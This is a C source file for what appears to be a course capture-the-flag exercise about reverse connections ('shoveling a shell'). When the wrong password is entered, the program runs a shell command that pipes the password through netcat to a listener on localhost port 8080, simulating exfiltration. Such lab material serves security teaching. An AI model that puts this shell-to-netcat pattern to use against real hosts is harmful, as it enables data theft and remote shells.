/* Adapted from Lydia Simmons CS 492/592 Winter 2017 */
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <signal.h>
#include <sys/ptrace.h>
#define USERDEF "AAAAAA"

void printflag()
{
	int fd;
	int len;
	unsigned char data[128];

	fd = open("flag", O_RDONLY);

	if ( fd <= 0 ) {
		printf("Failed to open flag.\n");
		return;
	}

	len = lseek( fd, 0, SEEK_END);
	lseek(fd, 0, SEEK_SET);

	if ( len > 128 ) {
		len = 128;
	}

	memset(data, 0, 128);
	read( fd, data, len);
	close(fd);

	printf("%s\n", data);
	return;
}

int main() {
  char buff[9];
  pid_t pid;

  printf("\nIn this level, you are playing the adversary. Firewalls block\nincoming network connections to prevent a hijacked machine from receiving\nrequests. To get around that, you have installed malware that instead\ncauses the _victim_ to make an outgoing connection to a port of your \nchoice (8080) while you listen for it. (When used to spawn a remote shell,\nthis is called \"shoveling a shell\"). To solve this level, use netcat \nto listen on port 8080 in another window, then launch this process and enter\na password.  The victim will then send you the actual password.\n\n");
  char *args[] = {
    "/bin/sh",
    "-c",
    "echo 'AAAAAA' | netcat localhost 8080",
    NULL
  };

  printf("Enter the password: ");
  scanf("%8s",buff);

  if (strcmp(buff,USERDEF)) {
        printf("Try again.\n");
        execv(args[0], args);
  } else {
	    printf("Good Job.\n");
        printflag();
  }
}
